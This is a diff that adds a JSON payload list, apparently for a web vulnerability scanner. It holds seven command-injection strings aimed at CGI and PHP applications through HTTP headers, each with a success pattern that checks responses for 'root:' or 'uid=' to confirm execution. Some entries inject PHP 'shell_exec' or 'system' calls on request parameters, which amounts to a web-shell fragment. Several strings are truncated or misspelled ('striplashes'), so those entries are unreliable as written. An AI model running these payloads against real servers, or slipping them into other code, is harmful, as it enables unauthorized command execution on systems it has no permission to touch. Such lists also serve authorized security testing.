@@ -1,0 +1,79 @@
+[
+  {
+    "payload_id": "OWP-56624",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "CGI",
+    "injection_point": "header",
+    "payload_string": "'echo 1 && echo _START_ && '",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-56625",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "CGI",
+    "injection_point": "header",
+    "payload_string": "& echo _END_'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-60237",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "header",
+    "payload_string": "; echo\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-60238",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "header",
+    "payload_string": "; echo shell_exec($_REQUEST[\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-60239",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "header",
+    "payload_string": "; echo system($_REQUEST[\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-62393",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "header",
+    "payload_string": ";echo 666;if (get_magic_quotes_gpc()) {$_GET[cmd]=striplashes($_GET[cmd]);}'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  },
+  {
+    "payload_id": "OWP-62394",
+    "vulnerability_category": "Injection (Command Injection)",
+    "target_technology": "PHP",
+    "injection_point": "header",
+    "payload_string": ";echo 666;die;?>'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "root:|uid=|Volume"
+    }
+  }
+]
